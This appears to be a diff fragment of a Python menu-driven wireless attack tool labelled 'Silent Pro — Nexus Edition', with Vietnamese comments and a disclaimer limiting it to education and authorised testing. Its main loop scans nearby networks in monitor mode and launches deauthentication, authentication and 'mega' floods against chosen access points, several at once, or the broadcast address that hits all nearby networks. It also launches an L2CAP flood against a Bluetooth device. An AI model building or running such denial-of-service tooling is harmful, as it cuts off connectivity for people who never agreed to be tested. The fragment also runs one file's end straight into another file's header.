+                SystemManager.restart_network_manager()
+                SystemManager.restart_bluetooth()
+                SystemManager.unblock_adapters()
+                NexusUI.success(t('done'))
+                self.pause()
+
+            elif choice == "2":
+                if not self.wifi.get_wifi_interface():
+                    self.pause()
+                    continue
+                if not self.wifi.set_monitor_mode(True):
+                    self.pause()
+                    continue
+                targets = self.scanner.scan(duration=12)
+                self.selected_targets = targets
+                self.wifi.set_monitor_mode(False)
+                self.pause()
+
+            elif choice == "3":
+                self.bt.scan()
+                self.pause()
+
+            elif choice == "4":
+                if not self.wifi.get_wifi_interface():
+                    self.pause()
+                    continue
+                if not self.wifi.set_monitor_mode(True):
+                    self.pause()
+                    continue
+                targets = self.scanner.scan(duration=10)
+                if not targets:
+                    self.wifi.set_monitor_mode(False)
+                    self.pause()
+                    continue
+                print()
+                sel = input(f"{Colors.CYAN}{t('select_target')}: {Colors.RESET}")
+                try:
+                    idx = int(sel) - 1
+                    target = targets[idx]
+                except:
+                    NexusUI.error(t('invalid_choice'))
+                    self.wifi.set_monitor_mode(False)
+                    self.pause()
+                    continue
+                self.wifi.flood_target(target.bssid, mode="deauth")
+                self.wifi.set_monitor_mode(False)
+                self.pause()
+
+            elif choice == "5":
+                if not self.wifi.get_wifi_interface():
+                    self.pause()
+                    continue
+                if not self.wifi.set_monitor_mode(True):
+                    self.pause()
+                    continue
+                targets = self.scanner.scan(duration=10)
+                if not targets:
+                    self.wifi.set_monitor_mode(False)
+                    self.pause()
+                    continue
+                print()
+                sel = input(f"{Colors.CYAN}{t('select_target')}: {Colors.RESET}")
+                try:
+                    idx = int(sel) - 1
+                    target = targets[idx]
+                except:
+                    NexusUI.error(t('invalid_choice'))
+                    self.wifi.set_monitor_mode(False)
+                    self.pause()
+                    continue
+                self.wifi.flood_target(target.bssid, mode="mega")
+                self.wifi.set_monitor_mode(False)
+                self.pause()
+
+            elif choice == "6":
+                confirm = input(f"{Colors.YELLOW}{t('confirm_deauth_all')}{Colors.RESET}").strip().upper()
+                if confirm != "CÓ" and confirm != "YES":
+                    NexusUI.warn(t('cancelled'))
+                    self.pause()
+                    continue
+                if not self.wifi.get_wifi_interface():
+                    self.pause()
+                    continue
+                if not self.wifi.set_monitor_mode(True):
+                    self.pause()
+                    continue
+                self.wifi.flood_target("FF:FF:FF:FF:FF:FF", mode="global")
+                self.wifi.set_monitor_mode(False)
+                self.pause()
+
+            elif choice == "7":
+                if not self.wifi.get_wifi_interface():
+                    self.pause()
+                    continue
+                if not self.wifi.set_monitor_mode(True):
+                    self.pause()
+                    continue
+                targets = self.scanner.scan(duration=10)
+                if not targets:
+                    self.wifi.set_monitor_mode(False)
+                    self.pause()
+                    continue
+                print()
+                sel_str = input(f"{Colors.CYAN}{t('select_target')} (cách nhau bằng dấu cách): {Colors.RESET}")
+                try:
+                    indices = [int(x.strip()) - 1 for x in sel_str.split() if x.strip().isdigit()]
+                    selected = [targets[i] for i in indices if 0 <= i < len(targets)]
+                except:
+                    NexusUI.error(t('invalid_choice'))
+                    self.wifi.set_monitor_mode(False)
+                    self.pause()
+                    continue
+                if not selected:
+                    NexusUI.error(t('no_targets'))
+                    self.wifi.set_monitor_mode(False)
+                    self.pause()
+                    continue
+                self.wifi.flood_multiple_targets(selected)
+                self.wifi.set_monitor_mode(False)
+                self.pause()
+
+            elif choice == "8":
+                if not self.wifi.get_wifi_interface():
+                    self.pause()
+                    continue
+                if not self.wifi.set_monitor_mode(True):
+                    self.pause()
+                    continue
+                targets = self.scanner.scan(duration=10)
+                if not targets:
+                    self.wifi.set_monitor_mode(False)
+                    self.pause()
+                    continue
+                print()
+                sel = input(f"{Colors.CYAN}{t('select_target')}: {Colors.RESET}")
+                try:
+                    idx = int(sel) - 1
+                    target = targets[idx]
+                except:
+                    NexusUI.error(t('invalid_choice'))
+                    self.wifi.set_monitor_mode(False)
+                    self.pause()
+                    continue
+                self.wifi.flood_target(target.bssid, mode="auth")
+                self.wifi.set_monitor_mode(False)
+                self.pause()
+
+            elif choice == "9":
+                self.bt.scan()
+                mac = input(f"\n{Colors.CYAN}{t('enter_mac')}: {Colors.RESET}").strip()
+                if not mac or len(mac) < 17:
+                    NexusUI.error(t('invalid_choice'))
+                    self.pause()
+                    continue
+                self.bt.l2cap_flood(mac)
+                self.pause()
+
+            elif choice == "10":
+                confirm = input(f"{Colors.YELLOW}{t('confirm_exit')}{Colors.RESET}").strip().lower()
+                if confirm == "y" or confirm == "yes":
+                    print(f"{Colors.GREEN}{t('exiting')} {t('goodbye')}{Colors.RESET}")
+                    sys.exit(0)
+
+            else:
+                NexusUI.error(t('invalid_choice'))
+                time.sleep(1)
+
+# ═══════════════════════════════════════════════════════════════════════════
+# KHỞI CHẠY CHƯƠNG TRÌNH
+# ═══════════════════════════════════════════════════════════════════════════
+if __name__ == "__main__":
+    try:
+        app = SilentProNexus()
+        app.run()
+    except KeyboardInterrupt:
+        print(f"\n\n{Colors.GREEN}{t('exiting')} {t('goodbye')}{Colors.RESET}")
+        sys.exit(0)
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+╔══════════════════════════════════════════════════════════════════════════╗
+║                                                                          ║
+║               S I L E N T   P R O   —   N E X U S   E D I T I O N        ║
 ║                         HỆ THỐNG ĐA NGÔN NGỮ — 20 NGÔN NGỮ               ║
 ║                                                                          ║
 ║  ⚠️  CHỈ DÙNG CHO MỤC ĐÍCH GIÁO DỤC & KIỂM TRA ĐƯỢC PHÉP                 ║
